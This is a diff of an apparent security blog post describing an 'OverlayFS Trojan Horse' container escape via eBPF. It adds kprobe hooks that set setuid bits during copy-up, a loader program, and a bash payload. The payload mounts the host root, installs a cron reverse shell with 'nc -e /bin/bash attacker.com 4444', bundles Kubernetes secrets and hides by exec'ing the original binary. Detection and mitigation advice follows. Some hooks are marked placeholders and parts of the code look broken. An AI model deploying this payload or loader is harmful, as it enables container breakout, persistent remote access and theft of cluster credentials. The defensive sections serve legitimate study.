+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_setattr</span><span class="p">,</span> <span class="k">struct</span> <span class="n">dentry</span> <span class="o">*</span><span class="n">dentry</span><span class="p">,</span> <span class="k">struct</span> <span class="n">iattr</span> <span class="o">*</span><span class="n">attr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Get inode number</span>
+    <span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">;</span>
+    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">inode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_inode</span><span class="p">);</span>
+    <span class="n">u32</span> <span class="n">ino</span><span class="p">;</span>
+    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ino</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">inode</span><span class="o">-&gt;</span><span class="n">i_ino</span><span class="p">);</span>
     
-    <span class="c1">// Check if this is our target file</span>
-    <span class="n">value</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_files</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">value</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Check if this is one of our tracked files</span>
+    <span class="k">struct</span> <span class="n">copy_up_event</span> <span class="o">*</span><span class="n">event</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">active_copy_ups</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ino</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">{</span>
         <span class="c1">// Set the setuid bit</span>
-        <span class="n">attr</span><span class="o">-&gt;</span><span class="n">ia_mode</span> <span class="o">|=</span> <span class="n">S_ISUID</span><span class="p">;</span>
-        <span class="c1">// Clear our flag</span>
-        <span class="n">u32</span> <span class="n">zero</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_files</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">zero</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        <span class="n">u32</span> <span class="n">mode</span><span class="p">;</span>
+        <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">ia_mode</span><span class="p">);</span>
+        <span class="n">mode</span> <span class="o">|=</span> <span class="n">S_ISUID</span><span class="p">;</span>
+        <span class="n">bpf_probe_read_kernel_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">ia_mode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">ia_mode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">mode</span><span class="p">);</span>
+        
+        <span class="c1">// Mark as modified</span>
+        <span class="n">event</span><span class="o">-&gt;</span><span class="n">modified</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">active_copy_ups</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="n">event</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="c1">// Log the modification</span>
+        <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">event</span><span class="p">));</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Hook file content writing during copy-up</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/ovl_write_begin"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_write_begin</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Get inode number</span>
+    <span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">;</span>
+    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">inode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_inode</span><span class="p">);</span>
+    <span class="n">u32</span> <span class="n">ino</span><span class="p">;</span>
+    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ino</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">inode</span><span class="o">-&gt;</span><span class="n">i_ino</span><span class="p">);</span>
+    
+    <span class="c1">// Check if this is one of our tracked files</span>
+    <span class="k">struct</span> <span class="n">copy_up_event</span> <span class="o">*</span><span class="n">event</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">active_copy_ups</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ino</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Here we would prepare to modify the file content</span>
+        <span class="c1">// This is a placeholder - actual implementation would be more complex</span>
+        <span class="c1">// and would involve hooking into the actual write operations</span>
+        
+        <span class="c1">// Log the event</span>
+        <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">event</span><span class="p">));</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Hook completion of copy-up</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/ovl_copy_up_end"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_copy_up_end</span><span class="p">,</span> <span class="k">struct</span> <span class="n">dentry</span> <span class="o">*</span><span class="n">dentry</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Get inode number</span>
+    <span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">;</span>
+    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">inode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_inode</span><span class="p">);</span>
+    <span class="n">u32</span> <span class="n">ino</span><span class="p">;</span>
+    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ino</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">inode</span><span class="o">-&gt;</span><span class="n">i_ino</span><span class="p">);</span>
+    
+    <span class="c1">// Check if this is one of our tracked files</span>
+    <span class="k">struct</span> <span class="n">copy_up_event</span> <span class="o">*</span><span class="n">event</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">active_copy_ups</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ino</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Log the completion</span>
+        <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">event</span><span class="p">));</span>
+        
+        <span class="c1">// Clean up our tracking</span>
+        <span class="n">bpf_map_delete_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">active_copy_ups</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ino</span><span class="p">);</span>
     <span class="p">}</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 </pre></td></tr></tbody></table></code></pre></div></div>
 
+<h3 id="user-space-control-program">User-Space Control Program</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+</pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
+<span class="c1">// @copyable: true</span>
+<span class="c1">// User-space program to load and control the OverlayFS Trojan Horse eBPF program</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/resource.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/libbpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/bpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">"overlayfs_trojan.skel.h"</span><span class="cp">
+</span>
+<span class="k">static</span> <span class="k">volatile</span> <span class="n">bool</span> <span class="n">exiting</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+
+<span class="c1">// Payload to inject into target binaries</span>
+<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">PAYLOAD</span> <span class="o">=</span> 
+    <span class="s">"#!/bin/bash</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"# Container escape payload</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"if [ </span><span class="se">\"</span><span class="s">$(id -u)</span><span class="se">\"</span><span class="s"> = </span><span class="se">\"</span><span class="s">0</span><span class="se">\"</span><span class="s"> ]; then</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"  # We have root, attempt to escape</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"  mkdir -p /tmp/.escape</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"  mount --bind /proc/1/root /tmp/.escape</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"  echo </span><span class="se">\"</span><span class="s">[+] Container escaped to /tmp/.escape</span><span class="se">\"\n</span><span class="s">"</span>
+    <span class="s">"  # Establish persistence</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"  if [ -w /tmp/.escape/etc/crontab ]; then</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"    echo </span><span class="se">\"</span><span class="s">* * * * * root nc -e /bin/bash attacker.com 4444</span><span class="se">\"</span><span class="s"> &gt;&gt; /tmp/.escape/etc/crontab</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"    echo </span><span class="se">\"</span><span class="s">[+] Persistence established</span><span class="se">\"\n</span><span class="s">"</span>
+    <span class="s">"  fi</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"fi</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"# Execute original binary to avoid suspicion</span><span class="se">\n</span><span class="s">"</span>
+    <span class="s">"exec /bin/bash.orig </span><span class="se">\"</span><span class="s">$@</span><span class="se">\"\n</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">handle_event</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="kt">int</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">data_sz</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">copy_up_event</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[%s] Copy-up event: PID %d (%s) - File: %s, Modified: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+           <span class="n">e</span><span class="o">-&gt;</span><span class="n">timestamp</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">comm</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">,</span> 
+           <span class="n">e</span><span class="o">-&gt;</span><span class="n">modified</span> <span class="o">?</span> <span class="s">"YES"</span> <span class="o">:</span> <span class="s">"NO"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">sig_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">exiting</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">overlayfs_trojan_bpf</span> <span class="o">*</span><span class="n">skel</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">perf_buffer</span> <span class="o">*</span><span class="n">pb</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
+
+    <span class="c1">// Set up signal handler</span>
+    <span class="n">signal</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">);</span>
+    <span class="n">signal</span><span class="p">(</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">);</span>
+
+    <span class="c1">// Increase resource limits</span>
+    <span class="k">struct</span> <span class="n">rlimit</span> <span class="n">rlim</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">RLIM_INFINITY</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="n">RLIM_INFINITY</span><span class="p">,</span>
+    <span class="p">};</span>
+    <span class="n">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_MEMLOCK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
+
+    <span class="c1">// Load and verify BPF program</span>
+    <span class="n">skel</span> <span class="o">=</span> <span class="n">overlayfs_trojan_bpf__open_and_load</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">skel</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to open and load BPF skeleton</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Attach BPF programs</span>
+    <span class="n">err</span> <span class="o">=</span> <span class="n">overlayfs_trojan_bpf__attach</span><span class="p">(</span><span class="n">skel</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to attach BPF skeleton: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Set up perf buffer for events</span>
+    <span class="n">pb</span> <span class="o">=</span> <span class="n">perf_buffer__new</span><span class="p">(</span><span class="n">bpf_map__fd</span><span class="p">(</span><span class="n">skel</span><span class="o">-&gt;</span><span class="n">maps</span><span class="p">.</span><span class="n">events</span><span class="p">),</span> <span class="mi">64</span><span class="p">,</span> <span class="n">handle_event</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pb</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">err</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to create perf buffer: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"OverlayFS Trojan Horse eBPF program successfully loaded and attached!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Waiting for copy-up operations on target files...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Press Ctrl+C to exit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="c1">// Main loop</span>
+    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">exiting</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">err</span> <span class="o">=</span> <span class="n">perf_buffer__poll</span><span class="p">(</span><span class="n">pb</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">err</span> <span class="o">!=</span> <span class="o">-</span><span class="n">EINTR</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Error polling perf buffer: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+            <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="nl">cleanup:</span>
+    <span class="n">perf_buffer__free</span><span class="p">(</span><span class="n">pb</span><span class="p">);</span>
+    <span class="n">overlayfs_trojan_bpf__destroy</span><span class="p">(</span><span class="n">skel</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="o">-</span><span class="n">err</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="container-escape-payload">Container Escape Payload</h3>
+
+<p>The injected payload is designed to escape the container by mounting the host’s root filesystem:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
+<span class="c"># Container escape payload</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">id</span> <span class="nt">-u</span><span class="si">)</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"0"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+  <span class="c"># We have root, attempt to escape</span>
+  <span class="nb">mkdir</span> <span class="nt">-p</span> /tmp/.escape
+  mount <span class="nt">--bind</span> /proc/1/root /tmp/.escape
+  <span class="nb">echo</span> <span class="s2">"[+] Container escaped to /tmp/.escape"</span>
+  
+  <span class="c"># Establish persistence</span>
+  <span class="k">if</span> <span class="o">[</span> <span class="nt">-w</span> /tmp/.escape/etc/crontab <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"* * * * * root nc -e /bin/bash attacker.com 4444"</span> <span class="o">&gt;&gt;</span> /tmp/.escape/etc/crontab
+    <span class="nb">echo</span> <span class="s2">"[+] Persistence established"</span>
+  <span class="k">fi</span>
+  
+  <span class="c"># Exfiltrate sensitive data</span>
+  <span class="k">if</span> <span class="o">[</span> <span class="nt">-d</span> /tmp/.escape/etc/kubernetes <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">tar </span>czf /tmp/k8s-secrets.tar.gz /tmp/.escape/etc/kubernetes
+    <span class="c"># Exfiltration would happen here</span>
+  <span class="k">fi
+fi</span>
+
+<span class="c"># Execute original binary to avoid suspicion</span>
+<span class="nb">exec</span> /bin/bash.orig <span class="s2">"</span><span class="nv">$@</span><span class="s2">"</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
 <h3 id="detection-methods">Detection Methods</h3>
 
-<p>Defenders should monitor for:</p>
-<ul>
-  <li>Unexpected eBPF programs attaching to OverlayFS-related functions</li>
-  <li>Unusual file permission changes during copy-up operations</li>
-  <li>New set-uid binaries appearing in container layers</li>
-  <li>Unexpected modifications to binaries in container environments</li>
-</ul>
+<p>Defenders should implement multiple layers of detection:</p>
 
-<p>This technique demonstrates why proper eBPF restrictions are critical for maintaining container isolation, especially in multi-tenant environments where container breakout could lead to accessing other tenants’ data.</p>
+<ol>
+  <li><strong>eBPF Program Monitoring</strong>:
+    <ul>
+      <li>Monitor for eBPF programs attaching to OverlayFS-related functions</li>
+      <li>Track eBPF program loading patterns and verify signatures</li>
+      <li>Use tools like <code class="language-plaintext highlighter-rouge">bpftool</code> to list and inspect loaded programs</li>
+    </ul>
+  </li>
+  <li><strong>File Integrity Monitoring</strong>:
+    <ul>
+      <li>Implement checksums for critical binaries in container images</li>
+      <li>Monitor for unexpected set-uid binaries in container layers</li>
+      <li>Use tools like <code class="language-plaintext highlighter-rouge">auditd</code> to track file permission changes</li>
+    </ul>
+  </li>
+  <li><strong>Container Runtime Security</strong>:
+    <ul>
+      <li>Use read-only containers where possible</li>
+      <li>Implement seccomp profiles to restrict mount operations</li>
+      <li>Deploy container runtime security tools like Falco or Tracee</li>
+    </ul>
+  </li>
+  <li><strong>Specific Indicators</strong>:
+    <ul>
+      <li>New set-uid binaries appearing in container layers</li>
+      <li>Unexpected modifications to binaries in container environments</li>
+      <li>Unusual mount operations within containers</li>
+      <li>Suspicious network connections from container processes</li>
+    </ul>
+  </li>
+</ol>
+
+<h3 id="mitigation-strategies">Mitigation Strategies</h3>
+
+<ol>
+  <li><strong>Restrict eBPF Capabilities</strong>:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="c"># Remove CAP_BPF and CAP_SYS_ADMIN from container</span>
+docker run <span class="nt">--cap-drop</span><span class="o">=</span>bpf <span class="nt">--cap-drop</span><span class="o">=</span>sys_admin <span class="nt">--security-opt</span> no-new-privileges ...
+   
+<span class="c"># In Kubernetes</span>
+securityContext:
+  capabilities:
+    drop:
+      - BPF
+      - SYS_ADMIN
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li><strong>Use Read-Only Containers</strong>:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="c"># Docker read-only container</span>
+docker run <span class="nt">--read-only</span> ...
+   
+<span class="c"># Kubernetes Pod with read-only root filesystem</span>
+securityContext:
+  readOnlyRootFilesystem: <span class="nb">true</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li><strong>Implement File Integrity Monitoring</strong>:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="c"># Example using inotify to monitor file changes</span>
+inotifywait <span class="nt">-m</span> <span class="nt">-r</span> /var/lib/docker/overlay2 <span class="nt">-e</span> modify <span class="nt">-e</span> attrib |
+<span class="k">while </span><span class="nb">read </span>path action file<span class="p">;</span> <span class="k">do
+  if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span> <span class="o">==</span> <span class="k">*</span>.bin <span class="o">||</span> <span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span> <span class="o">==</span> <span class="k">*</span>.sh <span class="o">]]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"Alert: </span><span class="nv">$file</span><span class="s2"> was </span><span class="nv">$action</span><span class="s2"> in </span><span class="nv">$path</span><span class="s2">"</span>
+  <span class="k">fi
+done</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
 
 <h3 id="real-world-impact">Real-world Impact</h3>
 
@@ -603,6 +1148,33 @@
 </ul>
 
 <p>The ability to silently modify files during copy-up operations creates a particularly concerning scenario for cloud environments and managed Kubernetes services where multiple customers share the same infrastructure.</p>
+
+<p><strong>Attacker hat on</strong></p>
+
+<ol>
+  <li>Identify a container using OverlayFS (most Docker/Kubernetes environments)</li>
+  <li>Develop an eBPF program that hooks into OverlayFS copy-up functions</li>
+  <li>Load the malicious BPF program with appropriate privileges</li>
+  <li>Trigger file modifications within the container to initiate copy-up operations</li>
+  <li>The eBPF program intercepts the operation and modifies the file, adding set-uid bits</li>
+  <li>Execute the modified binary to escalate privileges</li>
+  <li>Use elevated privileges to escape container isolation</li>
+</ol>
+
+<p><strong>Defender hat on</strong></p>
+
+<ol>
+  <li>Remove CAP_BPF from container environments</li>
+  <li>Implement BPF LSM policies to restrict eBPF program loading</li>
+  <li>Use read-only containers where possible</li>
+  <li>Monitor for unexpected set-uid binaries in container layers</li>
+  <li>Implement file integrity monitoring for critical container files</li>
+  <li>Consider alternative container storage drivers if OverlayFS risks cannot be mitigated</li>
+</ol>
+
+<p><strong>Conclusion</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">eBPF is all you need</code>. The ability to intercept and modify filesystem operations through eBPF provides attackers with powerful primitives to subvert container isolation. This technique highlights the importance of treating eBPF capabilities as privileged operations that should be tightly controlled, especially in multi-tenant environments.</p>
 
                     </div>
                 </article>
